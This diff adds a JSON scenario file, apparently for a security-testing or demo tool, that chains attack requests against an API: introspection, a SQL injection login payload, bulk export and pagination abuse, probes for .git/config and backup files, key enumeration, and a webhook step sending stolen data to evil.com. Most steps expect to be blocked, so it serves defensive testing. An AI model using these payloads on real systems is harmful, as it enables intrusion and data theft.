@@ -1,0 +1,250 @@
+{
+  "id": "api-demo-data-exfiltration",
+  "name": "Chimera Data Exfiltration Techniques",
+  "category": "Data Leakage",
+  "difficulty": "Advanced",
+  "description": "Advanced data exfiltration and information disclosure attacks",
+  "steps": [
+    {
+      "id": "api-introspection",
+      "name": "API Schema Introspection",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/swagger.json"
+      },
+      "execution": {
+        "delayMs": 500
+      }
+    },
+    {
+      "id": "graphql-introspection",
+      "name": "GraphQL Introspection Query",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/api/graphql",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "query": "{__schema{types{name,fields{name,type{name}}}}}"
+        }
+      },
+      "execution": {
+        "delayMs": 800
+      },
+      "dependsOn": [
+        "api-introspection"
+      ]
+    },
+    {
+      "id": "bulk-export-users",
+      "name": "Bulk User Data Export",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/users/export?limit=999999&fields=*",
+        "headers": {
+          "Authorization": "Bearer {{token}}"
+        }
+      },
+      "execution": {
+        "delayMs": 1200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "graphql-introspection"
+      ]
+    },
+    {
+      "id": "verbose-error-mining",
+      "name": "Error Message Information Mining",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/login",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Debug-Mode": "true"
+        },
+        "body": {
+          "username": "' OR 1=1--",
+          "password": null,
+          "debug": true
+        }
+      },
+      "execution": {
+        "delayMs": 600
+      },
+      "dependsOn": [
+        "bulk-export-users"
+      ]
+    },
+    {
+      "id": "metadata-leak-headers",
+      "name": "Metadata Leak via Response Headers",
+      "stage": "exploitation",
+      "request": {
+        "method": "OPTIONS",
+        "url": "/api/admin/sensitive",
+        "headers": {
+          "X-Include-Debug-Headers": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 400
+      },
+      "dependsOn": [
+        "verbose-error-mining"
+      ]
+    },
+    {
+      "id": "pagination-bypass",
+      "name": "Pagination Limit Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/transactions?page=1&size=999999999",
+        "headers": {
+          "Authorization": "Bearer {{token}}"
+        }
+      },
+      "execution": {
+        "delayMs": 900
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "metadata-leak-headers"
+      ]
+    },
+    {
+      "id": "field-expansion-wildcard",
+      "name": "Field Expansion Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/users/profile?expand=*&include=hidden,internal,private",
+        "headers": {
+          "Authorization": "Bearer {{token}}"
+        }
+      },
+      "execution": {
+        "delayMs": 700
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pagination-bypass"
+      ]
+    },
+    {
+      "id": "backup-file-discovery",
+      "name": "Backup File Discovery",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/backup/database.sql"
+      },
+      "execution": {
+        "delayMs": 500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "field-expansion-wildcard"
+      ]
+    },
+    {
+      "id": "git-config-leak",
+      "name": "Git Configuration Leak",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/.git/config"
+      },
+      "execution": {
+        "delayMs": 300
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "backup-file-discovery"
+      ]
+    },
+    {
+      "id": "api-key-enumeration",
+      "name": "API Key Pattern Enumeration",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/keys/validate?key=sk_test_{{incremental}}"
+      },
+      "execution": {
+        "delayMs": 200,
+        "iterations": 20
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "git-config-leak"
+      ]
+    },
+    {
+      "id": "dns-exfiltration",
+      "name": "Data Exfiltration via DNS",
+      "stage": "exfiltration",
+      "request": {
+        "method": "POST",
+        "url": "/api/external/webhook",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "webhook_url": "http://sensitive-data.evil.com",
+          "data": "{{stolen_data}}"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "api-key-enumeration"
+      ]
+    },
+    {
+      "id": "timing-side-channel",
+      "name": "Timing Side Channel Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/verify",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "token": "a",
+          "measure_timing": true
+        }
+      },
+      "execution": {
+        "delayMs": 100,
+        "iterations": 50
+      },
+      "dependsOn": [
+        "dns-exfiltration"
+      ]
+    }
+  ]
+}
